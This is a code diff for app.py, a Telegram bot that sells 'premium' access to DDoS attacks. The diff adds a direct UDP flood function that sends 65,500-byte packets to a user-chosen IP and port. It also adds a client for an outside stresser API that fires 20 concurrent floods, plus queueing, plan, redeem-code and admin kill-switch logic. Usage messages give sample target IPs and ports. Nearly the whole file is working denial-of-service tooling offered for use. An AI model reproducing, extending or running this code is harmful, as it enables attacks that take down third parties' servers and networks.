@@ -1,4 +1,4 @@
-# app.py - Premium Only with 20x UDP Concurrent
+# app.py - Complete Bot with Working Attack + Premium Only + All Features
 import os
 import logging
 import asyncio
@@ -100,8 +100,8 @@ class Database:
                     "username": username, 
                     "first_name": first_name, 
                     "last_active": datetime.now(),
-                    "plan": "premium",  # All users are premium by default
-                    "plan_expiry": datetime.now() + timedelta(days=30),  # 30 days trial
+                    "plan": "premium",
+                    "plan_expiry": datetime.now() + timedelta(days=30),
                     "has_used_code": False
                 }},
                 upsert=True
@@ -129,15 +129,12 @@ class Database:
         plan = user.get("plan", "premium")
         expiry = user.get("plan_expiry")
         
-        # If no expiry, set default
         if not expiry:
             expiry = datetime.now() + timedelta(days=30)
             self.update_user_plan(user_id, "premium", expiry)
         
-        # Check if plan is expired
         if expiry and isinstance(expiry, datetime):
             if expiry < datetime.now():
-                # Auto-renew for now (you can change this)
                 expiry = datetime.now() + timedelta(days=30)
                 self.update_user_plan(user_id, "premium", expiry)
         
@@ -345,15 +342,100 @@ class Database:
 
 db = Database(MONGO_URI)
 
-# ===== QUEUE & ATTACK MANAGER =====
-class AttackQueue:
+# ===== ATTACK MANAGER =====
+class AttackManager:
     def __init__(self):
-        self.queue = []
         self.active_attacks = {}
         self.attack_counter = 0
         self.lock = threading.Lock()
-        self.is_running = True
-        self.is_processing = False
+        self.attack_logs = []
+        self.total_attacks = 0
+        self.concurrent_busy = 0
+    
+    def can_start_attack(self, user_id):
+        with self.lock:
+            user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
+            if user_attacks >= MAX_CONCURRENT:
+                return False, f"❌ Already running {user_attacks}/{MAX_CONCURRENT} concurrent attacks"
+            if len(self.active_attacks) >= 100:
+                return False, "❌ Too many active attacks globally."
+            return True, "OK"
+    
+    def start_attack(self, user_id, target, port, duration, method, attack_num):
+        with self.lock:
+            self.attack_counter += 1
+            attack_id = self.attack_counter
+            self.total_attacks += 1
+            self.concurrent_busy = len(self.active_attacks) + 1
+            self.active_attacks[attack_id] = {
+                'id': attack_id,
+                'user_id': user_id,
+                'target': target,
+                'port': port,
+                'duration': duration,
+                'method': method,
+                'attack_num': attack_num,
+                'start_time': datetime.now(),
+                'status': 'running'
+            }
+            return attack_id
+    
+    def stop_attack(self, attack_id):
+        with self.lock:
+            if attack_id in self.active_attacks:
+                self.active_attacks[attack_id]['status'] = 'stopped'
+                self.concurrent_busy = max(0, self.concurrent_busy - 1)
+                return True
+            return False
+    
+    def get_active_attacks(self, user_id=None):
+        with self.lock:
+            if user_id:
+                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
+            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
+    
+    def get_stats(self):
+        with self.lock:
+            active = len([a for a in self.active_attacks.values() if a['status'] == 'running'])
+            return {
+                'active': active,
+                'concurrent_busy': self.concurrent_busy,
+                'total': self.total_attacks,
+                'max': MAX_CONCURRENT
+            }
+    
+    def log_attack(self, user_id, target, port, duration, method, status, response):
+        self.attack_logs.append({
+            'user_id': user_id,
+            'target': target,
+            'port': port,
+            'duration': duration,
+            'method': method,
+            'status': status,
+            'response': response[:500],
+            'timestamp': datetime.now()
+        })
+    
+    def cleanup(self):
+        with self.lock:
+            now = datetime.now()
+            to_remove = []
+            for aid, att in self.active_attacks.items():
+                if att['status'] == 'stopped':
+                    to_remove.append(aid)
+                elif (now - att['start_time']).seconds > att['duration'] + 15:
+                    to_remove.append(aid)
+            for aid in to_remove:
+                del self.active_attacks[aid]
+                self.concurrent_busy = max(0, self.concurrent_busy - 1)
+
+attack_manager = AttackManager()
+
+# ===== QUEUE SYSTEM =====
+class AttackQueue:
+    def __init__(self):
+        self.queue = []
+        self.lock = threading.Lock()
     
     def add_to_queue(self, user_id, target, port, duration):
         with self.lock:
@@ -364,141 +446,117 @@ class AttackQueue:
             if user_in_queue >= MAX_CONCURRENT:
                 return False, f"❌ You already have {user_in_queue} attacks in queue"
             
-            self.attack_counter += 1
-            queue_id = self.attack_counter
-            
             queue_entry = {
-                'id': queue_id,
                 'user_id': user_id,
                 'target': target,
                 'port': port,
                 'duration': duration,
-                'status': 'queued',
                 'added_at': datetime.now(),
                 'position': len(self.queue) + 1
             }
             self.queue.append(queue_entry)
-            
             return True, queue_entry
     
     def get_queue_position(self, user_id):
         with self.lock:
             positions = []
             for i, q in enumerate(self.queue, 1):
-                if q['user_id'] == user_id and q['status'] == 'queued':
+                if q['user_id'] == user_id:
                     positions.append(i)
             return positions
     
     def get_queue_status(self, user_id=None):
         with self.lock:
             if user_id:
-                return [q for q in self.queue if q['user_id'] == user_id and q['status'] == 'queued']
-            return [q for q in self.queue if q['status'] == 'queued']
+                return [q for q in self.queue if q['user_id'] == user_id]
+            return self.queue
     
     def kill_switch(self):
         with self.lock:
-            killed_count = 0
-            for q in self.queue:
-                if q['status'] == 'queued':
-                    q['status'] = 'killed'
-                    killed_count += 1
-            for aid, att in list(self.active_attacks.items()):
-                if att['status'] == 'running':
-                    att['status'] = 'killed'
-                    killed_count += 1
-            return killed_count
+            killed = len(self.queue)
+            self.queue = []
+            return killed
     
     def kill_user_attacks(self, user_id):
         with self.lock:
-            killed_count = 0
-            for q in self.queue:
-                if q['user_id'] == user_id and q['status'] == 'queued':
-                    q['status'] = 'killed'
-                    killed_count += 1
-            for aid, att in list(self.active_attacks.items()):
-                if att['user_id'] == user_id and att['status'] == 'running':
-                    att['status'] = 'killed'
-                    killed_count += 1
-            return killed_count
-    
-    async def process_queue(self):
-        if self.is_processing:
-            return
-        
-        self.is_processing = True
-        
-        try:
-            while self.is_running:
-                next_attack = None
-                with self.lock:
-                    for q in self.queue:
-                        if q['status'] == 'queued':
-                            next_attack = q
-                            q['status'] = 'processing'
-                            break
-                
-                if not next_attack:
-                    await asyncio.sleep(1)
-                    continue
-                
-                with self.lock:
-                    active_count = sum(1 for a in self.active_attacks.values() if a['status'] == 'running')
-                    if active_count >= MAX_CONCURRENT:
-                        next_attack['status'] = 'queued'
-                        await asyncio.sleep(1)
-                        continue
-                
-                user_id = next_attack['user_id']
-                target = next_attack['target']
-                port = next_attack['port']
-                duration = next_attack['duration']
-                queue_id = next_attack['id']
-                
-                with self.lock:
-                    self.active_attacks[queue_id] = {
-                        'id': queue_id,
-                        'user_id': user_id,
-                        'target': target,
-                        'port': port,
-                        'duration': duration,
-                        'start_time': datetime.now(),
-                        'status': 'running'
-                    }
-                
-                result = await send_20x_udp_attacks(target, port, duration, queue_id)
-                attack_info = db.log_attack(user_id, target, port, duration, "udp", "success" if result.get('success') else "failed", 20)
-                await send_attack_alert(attack_info)
-                
-                with self.lock:
-                    if queue_id in self.active_attacks:
-                        del self.active_attacks[queue_id]
-                    self.queue = [q for q in self.queue if q['id'] != queue_id]
-                
-                await asyncio.sleep(0.5)
-                
-        except Exception as e:
-            logger.error(f"Queue processing error: {e}")
-        finally:
-            self.is_processing = False
+            killed = 0
+            self.queue = [q for q in self.queue if q['user_id'] != user_id]
+            return killed
 
 attack_queue = AttackQueue()
 
-# ===== 20x UDP CONCURRENT ATTACK =====
-async def send_single_udp_attack(target, port, duration, attack_num):
-    """Send a single UDP attack"""
-    url = "https://api.susstresser.com/panel/api/api.php"
+# ===== DIRECT UDP ATTACK =====
+def send_udp_direct(target, port, duration, attack_num):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(1)
+        payload = b"X" * 65500
+        end_time = time.time() + duration
+        packets_sent = 0
+        
+        while time.time() < end_time:
+            try:
+                sock.sendto(payload, (target, port))
+                packets_sent += 1
+                if packets_sent % 1000 == 0:
+                    logger.info(f"Attack {attack_num}: Sent {packets_sent} packets")
+            except:
+                pass
+        
+        sock.close()
+        return {
+            "success": True,
+            "attack_num": attack_num,
+            "packets_sent": packets_sent,
+            "method": "DIRECT_UDP"
+        }
+    except Exception as e:
+        return {
+            "success": False,
+            "attack_num": attack_num,
+            "error": str(e),
+            "method": "DIRECT_UDP"
+        }
+
+# ===== API UDP ATTACK =====
+async def send_udp_api(target, port, duration, attack_num):
+    base_url = "https://api.susstresser.com/panel/api/api.php"
     
-    params = {
-        "key": API_KEY,
-        "host": target,
-        "port": port,
-        "time": duration,
-        "method": "udp",
-        "threads": 5000,
-        "pps": 5000000,
-        "size": 65500,
-        "random": "true"
-    }
+    api_formats = [
+        {
+            "params": {
+                "key": API_KEY,
+                "host": target,
+                "port": port,
+                "time": duration,
+                "method": "udp",
+                "threads": 5000,
+                "pps": 5000000,
+                "size": 65500
+            },
+            "method": "POST"
+        },
+        {
+            "params": {
+                "key": API_KEY,
+                "host": target,
+                "port": port,
+                "time": duration,
+                "method": "telegramvc"
+            },
+            "method": "POST"
+        },
+        {
+            "params": {
+                "key": API_KEY,
+                "host": target,
+                "port": port,
+                "time": duration,
+                "method": "udp"
+            },
+            "method": "GET"
+        }
+    ]
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -508,59 +566,140 @@ async def send_single_udp_attack(target, port, duration, attack_num):
         "Content-Type": "application/x-www-form-urlencoded"
     }
     
-    try:
-        timeout = aiohttp.ClientTimeout(total=duration + 15)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            start_time = time.time()
-            async with session.get(url, params=params, headers=headers) as response:
-                elapsed = time.time() - start_time
-                raw_response = await response.read()
-                try:
-                    result_text = raw_response.decode('utf-8')
-                except:
-                    result_text = raw_response.decode('utf-8', errors='ignore')
+    for format_data in api_formats:
+        try:
+            timeout = aiohttp.ClientTimeout(total=duration + 15)
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                start_time = time.time()
                 
-                is_success = (
-                    "SUCCESS" in result_text or 
-                    "sent" in result_text.lower() or
-                    "attack" in result_text.lower() or
-                    "Host:" in result_text or
-                    "Concurrent:" in result_text
-                )
+                if format_data["method"] == "POST":
+                    async with session.post(base_url, data=format_data["params"], headers=headers) as response:
+                        elapsed = time.time() - start_time
+                        raw_response = await response.read()
+                        try:
+                            result_text = raw_response.decode('utf-8')
+                        except:
+                            result_text = raw_response.decode('utf-8', errors='ignore')
+                        
+                        success_indicators = ["SUCCESS", "sent", "attack", "Host:", "Concurrent:", "1/1", "successfully"]
+                        is_success = any(indicator in result_text for indicator in success_indicators)
+                        
+                        if is_success and "<form" not in result_text:
+                            return {
+                                "success": True,
+                                "attack_num": attack_num,
+                                "method": "API_POST",
+                                "status": response.status,
+                                "elapsed": f"{elapsed:.2f}s",
+                                "response": result_text[:300]
+                            }
+                else:
+                    async with session.get(base_url, params=format_data["params"], headers=headers) as response:
+                        elapsed = time.time() - start_time
+                        raw_response = await response.read()
+                        try:
+                            result_text = raw_response.decode('utf-8')
+                        except:
+                            result_text = raw_response.decode('utf-8', errors='ignore')
+                        
+                        success_indicators = ["SUCCESS", "sent", "attack", "Host:", "Concurrent:", "1/1", "successfully"]
+                        is_success = any(indicator in result_text for indicator in success_indicators)
+                        
+                        if is_success and "<form" not in result_text:
+                            return {
+                                "success": True,
+                                "attack_num": attack_num,
+                                "method": "API_GET",
+                                "status": response.status,
+                                "elapsed": f"{elapsed:.2f}s",
+                                "response": result_text[:300]
+                            }
                 
-                return {
-                    "success": is_success,
-                    "attack_num": attack_num,
-                    "status": response.status,
-                    "elapsed": f"{elapsed:.2f}s",
-                    "response": result_text[:200]
-                }
-    except Exception as e:
-        return {
-            "success": False,
-            "attack_num": attack_num,
-            "error": str(e)
-        }
+                await asyncio.sleep(0.2)
+                
+        except Exception as e:
+            continue
+    
+    return {
+        "success": False,
+        "attack_num": attack_num,
+        "error": "All API formats failed",
+        "method": "API_FAILED"
+    }
 
-async def send_20x_udp_attacks(target, port, duration, queue_id):
-    """Send 20 concurrent UDP attacks"""
-    logger.info(f"🚀 Launching 20x UDP attacks on {target}:{port} (Queue ID: {queue_id})")
+# ===== 20 CONCURRENT ATTACKS =====
+async def send_20_concurrent_attacks(target, port, duration):
+    logger.info(f"🚀 Launching 20 concurrent attacks on {target}:{port}")
     
     tasks = []
     for i in range(1, 21):
-        task = send_single_udp_attack(target, port, duration, i)
+        task = send_udp_api(target, port, duration, i)
         tasks.append(task)
     
     results = await asyncio.gather(*tasks)
     success_count = sum(1 for r in results if r.get('success', False))
+    
+    if success_count < 5:
+        logger.info("⚠️ Low API success rate, trying direct UDP...")
+        failed_nums = [r['attack_num'] for r in results if not r.get('success', False)]
+        direct_tasks = []
+        for num in failed_nums[:10]:
+            direct_tasks.append(asyncio.to_thread(send_udp_direct, target, port, duration, num))
+        
+        if direct_tasks:
+            direct_results = await asyncio.gather(*direct_tasks)
+            for dr in direct_results:
+                for i, r in enumerate(results):
+                    if r.get('attack_num') == dr.get('attack_num') and not r.get('success'):
+                        results[i] = dr
+                        if dr.get('success'):
+                            success_count += 1
+                        break
     
     return {
         "success": success_count > 0,
         "total_attacks": len(results),
         "successful": success_count,
         "failed": len(results) - success_count,
-        "results": results
+        "results": results,
+        "target": target,
+        "port": port,
+        "duration": duration
     }
+
+# ===== PROCESS QUEUE =====
+async def process_queue():
+    while True:
+        queue = attack_queue.get_queue_status()
+        if queue:
+            for entry in queue:
+                can_start, _ = attack_manager.can_start_attack(entry['user_id'])
+                if can_start:
+                    # Remove from queue
+                    with attack_queue.lock:
+                        if entry in attack_queue.queue:
+                            attack_queue.queue.remove(entry)
+                    
+                    # Start attack
+                    user_id = entry['user_id']
+                    target = entry['target']
+                    port = entry['port']
+                    duration = entry['duration']
+                    
+                    attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
+                    result = await send_20_concurrent_attacks(target, port, duration)
+                    
+                    attack_manager.log_attack(
+                        user_id, target, port, duration, "udp",
+                        "success" if result.get('success') else "failed",
+                        str(result)
+                    )
+                    
+                    attack_manager.stop_attack(list(attack_manager.active_attacks.keys())[-1] if attack_manager.active_attacks else 0)
+                    attack_manager.cleanup()
+                    
+                    await asyncio.sleep(1)
+        await asyncio.sleep(2)
 
 # ===== BOT HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -572,15 +711,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     plan, expiry = db.get_user_plan(user.id)
     plan_display = "💎 PREMIUM"
-    
     if expiry:
         days_left = max(0, (expiry - datetime.now()).days)
         plan_display += f" ({days_left}d left)"
     
-    queued = attack_queue.get_queue_status(user.id)
-    queue_count = len(queued)
-    active = attack_queue.active_attacks
-    active_count = sum(1 for a in active.values() if a['user_id'] == user.id)
+    queue_count = len(attack_queue.get_queue_status(user.id))
+    active_count = len(attack_manager.get_active_attacks(user.id))
     
     first_name = user.first_name or "User"
     welcome_msg = (
@@ -595,7 +731,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     
     keyboard = []
-    
     if not db.is_banned(user.id):
         keyboard.append([InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")])
         keyboard.append([InlineKeyboardButton("📌 MY QUEUE", callback_data="my_queue")])
@@ -629,8 +764,8 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 3:
         await update.message.reply_text(
             "❌ *Usage:* `/attack IP PORT TIME`\n\n"
-            "Example: `/attack 91.108.17.25 32002 60`\n\n"
-            "⚡ This launches 20x UDP concurrent attacks!\n"
+            "Example: `/attack 91.108.17.19 32001 60`\n\n"
+            "⚡ 20 concurrent UDP attacks!\n"
             "📦 Packet Size: 65,500 bytes\n"
             "💪 Threads: 5,000 each\n"
             "⏱️ Time: 60-300 seconds",
@@ -643,38 +778,82 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         port = int(args[1])
         duration = int(args[2])
         
-        if duration < 60 or duration > 300:
-            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
+        if duration < 60:
+            await update.message.reply_text("❌ Minimum duration is 60 seconds!")
+            return
+        if duration > 300:
+            await update.message.reply_text("❌ Maximum duration is 300 seconds!")
             return
         
-        success, result = attack_queue.add_to_queue(user_id, target, port, duration)
-        
-        if not success:
-            await update.message.reply_text(result)
+        can_start, msg = attack_manager.can_start_attack(user_id)
+        if not can_start:
+            # Add to queue
+            success, result = attack_queue.add_to_queue(user_id, target, port, duration)
+            if not success:
+                await update.message.reply_text(result)
+                return
+            
+            position = attack_queue.get_queue_position(user_id)
+            await update.message.reply_text(
+                f"📌 *ATTACK ADDED TO QUEUE*\n\n"
+                f"🎯 Target: `{target}`\n"
+                f"📡 Port: `{port}`\n"
+                f"⏱️ Time: `{duration}s`\n"
+                f"📌 Position: {position[0] if position else 'N/A'}\n"
+                f"📊 Queue Size: {len(attack_queue.queue)}/{MAX_QUEUE}",
+                parse_mode='Markdown'
+            )
             return
         
-        position = attack_queue.get_queue_position(user_id)
-        
-        await update.message.reply_text(
-            f"✅ *20x UDP ATTACK ADDED TO QUEUE*\n\n"
+        status_msg = await update.message.reply_text(
+            f"🚀 *20x UDP ATTACK STARTED*\n\n"
             f"🎯 Target: `{target}`\n"
             f"📡 Port: `{port}`\n"
             f"⏱️ Time: `{duration}s`\n"
             f"⚡ Attacks: `20 CONCURRENT`\n"
-            f"📦 Packet: `65,500 bytes`\n"
-            f"📊 Queue ID: `{result['id']}`\n"
-            f"📌 Position: {position[0] if position else 'N/A'}\n"
-            f"📊 Queue Size: {len(attack_queue.queue)}/{MAX_QUEUE}\n\n"
-            f"⏳ Your 20x attacks will start automatically!",
+            f"📦 Packet: `65,500 bytes`",
             parse_mode='Markdown'
         )
         
-    except ValueError:
-        await update.message.reply_text("❌ Invalid port or time! Use numbers.")
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
+        result = await send_20_concurrent_attacks(target, port, duration)
+        
+        attack_manager.log_attack(
+            user_id, target, port, duration, "udp",
+            "success" if result.get('success') else "failed",
+            str(result)
+        )
+        
+        if result.get('success'):
+            response_text = (
+                f"✅ *20x UDP ATTACK SUCCESSFUL!*\n\n"
+                f"🎯 Target: `{target}`\n"
+                f"📡 Port: `{port}`\n"
+                f"⏱️ Time: `{duration}s`\n"
+                f"📊 Attack ID: `{attack_id}`\n"
+                f"⚡ Status: ✅ SUCCESS\n\n"
+                f"📊 Success Rate: {result['successful']}/{result['total_attacks']}"
+            )
+        else:
+            response_text = (
+                f"❌ *20x UDP ATTACK FAILED*\n\n"
+                f"🎯 Target: `{target}`\n"
+                f"📡 Port: `{port}`\n"
+                f"⏱️ Time: `{duration}s`\n"
+                f"📊 Attack ID: `{attack_id}`\n"
+                f"⚡ Status: ❌ FAILED"
+            )
+        
+        await status_msg.edit_text(response_text, parse_mode='Markdown')
+        attack_manager.stop_attack(attack_id)
+        attack_manager.cleanup()
+        
+    except ValueError as e:
+        await update.message.reply_text(f"❌ Invalid port or time! Use numbers.\nError: {e}")
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
-# ===== BUTTON ATTACK HANDLER =====
+# ===== BUTTON ATTACK =====
 async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -686,12 +865,11 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.edit_message_text(
         "💥 *20x UDP ATTACK*\n\n"
         "Send: `IP PORT TIME`\n"
-        "Example: `91.108.17.25 32002 60`\n\n"
-        "⚡ This launches 20 concurrent UDP attacks!\n"
+        "Example: `91.108.17.19 32001 60`\n\n"
+        "⚡ 20 concurrent UDP attacks!\n"
         "📦 Packet Size: 65,500 bytes\n"
         "💪 Threads: 5,000 each\n"
         "⏱️ Time: 60-300 seconds\n\n"
-        f"📊 Queue Size: {len(attack_queue.queue)}/{MAX_QUEUE}\n\n"
         "Send /cancel to cancel",
         parse_mode='Markdown'
     )
@@ -723,28 +901,55 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ Duration must be 60-300 seconds!")
             return
         
-        success, result = attack_queue.add_to_queue(user_id, target, port, duration)
-        
-        if not success:
-            await update.message.reply_text(result)
+        can_start, msg = attack_manager.can_start_attack(user_id)
+        if not can_start:
+            success, result = attack_queue.add_to_queue(user_id, target, port, duration)
+            if not success:
+                await update.message.reply_text(result)
+                context.user_data['awaiting_attack'] = False
+                return
+            
+            position = attack_queue.get_queue_position(user_id)
+            await update.message.reply_text(
+                f"📌 *ATTACK ADDED TO QUEUE*\n\n"
+                f"🎯 Target: `{target}`\n"
+                f"📡 Port: `{port}`\n"
+                f"⏱️ Time: `{duration}s`\n"
+                f"📌 Position: {position[0] if position else 'N/A'}",
+                parse_mode='Markdown'
+            )
             context.user_data['awaiting_attack'] = False
             return
         
-        position = attack_queue.get_queue_position(user_id)
-        
-        await update.message.reply_text(
-            f"✅ *20x UDP ATTACK ADDED TO QUEUE*\n\n"
-            f"🎯 Target: `{target}`\n"
-            f"📡 Port: `{port}`\n"
-            f"⏱️ Time: `{duration}s`\n"
-            f"⚡ Attacks: `20 CONCURRENT`\n"
-            f"📦 Packet: `65,500 bytes`\n"
-            f"📊 Queue ID: `{result['id']}`\n"
-            f"📌 Position: {position[0] if position else 'N/A'}\n"
-            f"📊 Queue Size: {len(attack_queue.queue)}/{MAX_QUEUE}\n\n"
-            f"⏳ Your 20x attacks will start automatically!",
-            parse_mode='Markdown'
+        status_msg = await update.message.reply_text(
+            f"🚀 Launching 20 UDP attacks on {target}:{port} for {duration}s..."
         )
+        
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
+        result = await send_20_concurrent_attacks(target, port, duration)
+        
+        if result.get('success'):
+            response_text = (
+                f"✅ *20x UDP SUCCESS!*\n\n"
+                f"🎯 Target: `{target}`\n"
+                f"📡 Port: `{port}`\n"
+                f"⏱️ Time: `{duration}s`\n"
+                f"📊 Attack ID: `{attack_id}`\n"
+                f"⚡ Status: ✅ SUCCESS"
+            )
+        else:
+            response_text = (
+                f"❌ *ATTACK FAILED*\n\n"
+                f"🎯 Target: `{target}`\n"
+                f"📡 Port: `{port}`\n"
+                f"⏱️ Time: `{duration}s`\n"
+                f"📊 Attack ID: `{attack_id}`\n"
+                f"⚡ Status: ❌ FAILED"
+            )
+        
+        await status_msg.edit_text(response_text, parse_mode='Markdown')
+        attack_manager.stop_attack(attack_id)
+        attack_manager.cleanup()
         
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {str(e)}")
@@ -758,9 +963,9 @@ async def my_queue_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     user_id = query.from_user.id
     queued = attack_queue.get_queue_status(user_id)
-    active = attack_queue.active_attacks
+    active = attack_manager.get_active_attacks(user_id)
     
-    if not queued and not any(a['user_id'] == user_id for a in active.values()):
+    if not queued and not active:
         await query.edit_message_text(
             "📌 *YOUR QUEUE*\n\nNo attacks in queue or active.",
             parse_mode='Markdown',
@@ -770,20 +975,18 @@ async def my_queue_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     text = "📌 *YOUR QUEUE & ACTIVE ATTACKS*\n\n"
     
-    active_for_user = [a for a in active.values() if a['user_id'] == user_id and a['status'] == 'running']
-    if active_for_user:
+    if active:
         text += "⚡ *Active Attacks:*\n"
-        for a in active_for_user:
-            elapsed = (datetime.now() - a['start_time']).seconds
-            remaining = max(0, a['duration'] - elapsed)
-            text += f"🔹 20x UDP - {a['target']}:{a['port']} - {remaining}s left\n"
+        for aid, att in active.items():
+            elapsed = (datetime.now() - att['start_time']).seconds
+            remaining = max(0, att['duration'] - elapsed)
+            text += f"🔹 {att['target']}:{att['port']} - {remaining}s left\n"
         text += "\n"
     
     if queued:
         text += "📌 *Queued Attacks:*\n"
         for i, q in enumerate(queued, 1):
-            position = q.get('position', i)
-            text += f"🔸 20x UDP - {q['target']}:{q['port']} - {q['duration']}s (Position: {position})\n"
+            text += f"🔸 {q['target']}:{q['port']} - {q['duration']}s (Position: {i})\n"
     
     await query.edit_message_text(
         text,
@@ -826,14 +1029,13 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     level = db.get_admin_level(user_id) or "USER"
     plan, expiry = db.get_user_plan(user_id)
-    plan_display = "PREMIUM"
     total_attacks = db.get_user_stats(user_id)
     
     await query.edit_message_text(
         f"👤 *USER INFO*\n\n"
         f"🆔 ID: {user_id}\n"
         f"⭐ Level: {level.upper()}\n"
-        f"📊 Plan: {plan_display}\n"
+        f"📊 Plan: PREMIUM\n"
         f"⚡ 20x UDP: ENABLED\n"
         f"💥 Total Attacks: {total_attacks}",
         parse_mode='Markdown',
@@ -855,7 +1057,7 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     admins = db.get_admins()
     codes = db.get_codes()
     queue_size = len(attack_queue.queue)
-    active = len(attack_queue.active_attacks)
+    active = len(attack_manager.active_attacks)
     
     stats_text = (
         f"📊 *BOT STATISTICS*\n\n"
@@ -1000,9 +1202,6 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer("Access denied!", show_alert=True)
         return
     
-    queue_size = len(attack_queue.queue)
-    active = len(attack_queue.active_attacks)
-    
     keyboard = [
         [InlineKeyboardButton("🛑 KILL SWITCH", callback_data="owner_kill")],
         [InlineKeyboardButton("🔪 KILL USER", callback_data="owner_kill_user")],
@@ -1017,11 +1216,7 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     
     await query.edit_message_text(
-        f"👑 *OWNER PANEL*\n\n"
-        f"📌 Queue Size: {queue_size}/{MAX_QUEUE}\n"
-        f"⚡ Active Attacks: {active}/{MAX_CONCURRENT}\n"
-        f"⚡ 20x UDP: ENABLED\n\n"
-        f"Select action:",
+        f"👑 *OWNER PANEL*\n\nSelect action:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -1030,23 +1225,24 @@ async def owner_kill_switch_callback(update: Update, context: ContextTypes.DEFAU
     query = update.callback_query
     await query.answer()
     
-    user_id = query.from_user.id
-    if not db.is_owner_or_pseudo(user_id):
+    if not db.is_owner_or_pseudo(query.from_user.id):
         await query.answer("Access denied!", show_alert=True)
         return
     
     killed = attack_queue.kill_switch()
+    # Also stop active attacks
+    for aid in list(attack_manager.active_attacks.keys()):
+        attack_manager.stop_attack(aid)
     
     await query.edit_message_text(
         f"🛑 *KILL SWITCH ACTIVATED*\n\n"
-        f"✅ {killed} 20x UDP attacks stopped/killed\n"
-        f"📌 Queue cleared\n"
-        f"⚡ All attacks stopped successfully!",
+        f"✅ {killed} attacks removed from queue\n"
+        f"✅ All active attacks stopped\n"
+        f"⚡ System cleared!",
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
     )
 
-# ===== OWNER KILL USER =====
 async def owner_kill_user_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -1077,9 +1273,15 @@ async def process_kill_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = int(update.message.text.strip())
         killed = attack_queue.kill_user_attacks(user_id)
         
+        # Stop active attacks for user
+        active = attack_manager.get_active_attacks(user_id)
+        for aid in active:
+            attack_manager.stop_attack(aid)
+        
         await update.message.reply_text(
             f"🔪 *USER ATTACKS KILLED*\n\n"
-            f"✅ {killed} attacks killed for user `{user_id}`",
+            f"✅ {killed} attacks removed from queue\n"
+            f"✅ Active attacks stopped for user `{user_id}`",
             parse_mode='Markdown'
         )
     except:
@@ -1087,7 +1289,6 @@ async def process_kill_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     context.user_data['awaiting_kill_user'] = False
 
-# ===== KILL COMMAND =====
 async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
@@ -1096,12 +1297,14 @@ async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     killed = attack_queue.kill_switch()
+    for aid in list(attack_manager.active_attacks.keys()):
+        attack_manager.stop_attack(aid)
     
     await update.message.reply_text(
         f"🛑 *KILL SWITCH ACTIVATED*\n\n"
-        f"✅ {killed} 20x UDP attacks stopped/killed\n"
-        f"📌 Queue cleared\n"
-        f"⚡ All attacks stopped successfully!",
+        f"✅ {killed} attacks removed from queue\n"
+        f"✅ All active attacks stopped\n"
+        f"⚡ System cleared!",
         parse_mode='Markdown'
     )
 
@@ -1110,12 +1313,12 @@ async def owner_queue_status_callback(update: Update, context: ContextTypes.DEFA
     await query.answer()
     
     queue = attack_queue.get_queue_status()
-    active = attack_queue.active_attacks
+    active = attack_manager.get_active_attacks()
     
     text = "📌 *QUEUE & ACTIVE ATTACKS*\n\n"
     
     if active:
-        text += "⚡ *Active Attacks (20x UDP):*\n"
+        text += "⚡ *Active Attacks:*\n"
         for aid, att in active.items():
             elapsed = (datetime.now() - att['start_time']).seconds
             remaining = max(0, att['duration'] - elapsed)
@@ -1125,7 +1328,7 @@ async def owner_queue_status_callback(update: Update, context: ContextTypes.DEFA
         text += "⚡ No active attacks\n\n"
     
     if queue:
-        text += "📌 *Queued Attacks (20x UDP):*\n"
+        text += "📌 *Queued Attacks:*\n"
         for i, q in enumerate(queue, 1):
             text += f"🔸 {q['target']}:{q['port']} - {q['duration']}s (User: {q['user_id']})\n"
     else:
@@ -1307,7 +1510,7 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"Duration: {result['access_days']} days\n"
             f"📊 Plan: PREMIUM\n"
             f"⚡ 20x UDP: ENABLED\n\n"
-            f"🎉 You now have premium access with 20x UDP!",
+            f"🎉 You now have premium access!",
             parse_mode='Markdown'
         )
     else:
